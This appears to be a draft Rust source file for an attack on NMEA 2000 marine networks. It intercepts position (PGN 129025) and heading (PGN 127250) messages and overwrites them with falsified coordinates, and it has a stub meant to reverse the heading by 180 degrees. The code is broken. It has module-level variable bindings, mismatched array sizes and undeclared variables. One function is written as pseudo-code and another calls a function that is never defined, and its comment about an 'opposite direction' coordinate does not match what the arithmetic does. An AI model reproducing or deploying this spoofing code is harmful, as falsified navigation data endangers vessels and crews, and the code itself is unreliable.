use nmea_msg::NMEAMsg;

let mut last_lat: i32 = 0;
let mut last_lon: i32 = 0;

enum PositionPGN
{
    _129025,
}

enum HeadingPGN
{
    _127250,
}

let position_PGNs: [i32; 1] = [129025];

/// Modifies a message with latitude and longitude
pub fn lat_lon_attack(msg: NMEAMsg) -> NMEAMsg{

    // for 129025 ----------------------------------------------

    // Latitude
    let mut lat_arr: [u8; 4] = [0; 4]; 
    lat_arr.copy_from_slice(&msg.data[0..4]);   
    let lat: i32 = i32::from_be_bytes(lat_arr); 

    // Longitude
    let mut lon_arr: [u8; 4] = [4; 8]; 
    lon_arr.copy_from_slice(&msg.data[4..8]);
    let lon: i32 = i32::from_be_bytes(lon_arr);  

    // get the differences and calculate fake coordinate in opposite direction
    lat_diff = lat - last_lat;
    fake_lat = lat - lat_diff;
    lon_diff = lon - last_lon;
    fake_lon = lon - lon_diff;

    // put fake data into messages
    let lat_bytes: [u8; 4] = fake_lat.to_be_bytes();
    msg.data[0..4].copy_from_slice(&lat_bytes);

    let lon_bytes: [u8; 4] = fake_lon.to_be_bytes();
    msg.data[4..8].copy_from_slice(&lon_bytes);
    

    last_lat = lat;
    last_lon = lon;


    return msg;
}
/// Modifies a message with a heading
pub fn heading_attack(msg: NMEAMsg) -> NMEAMsg{

    // get heading based on PNG
    // subtract / add 180 degrees


    return msg;
}

/// Modifies a message if it contains positional data
pub fn attack(msg: NMEAMsg) -> NMEAMsg{

    let mut position = false;
    let mut heading = false;

    for each PGN in POsitional list
    {
        If msg.pgn == PGN
        {
            position = true;
        }
    }
    for each PGN in Heading list
    {
        if msg.pgn == PGN
        {
            heading = true;
        }
    }
    
    if heading
    {
        msg = heading_attack(msg);
    }

    if position
    {
        msg = position_attack(msg);
    }

    return msg;
}


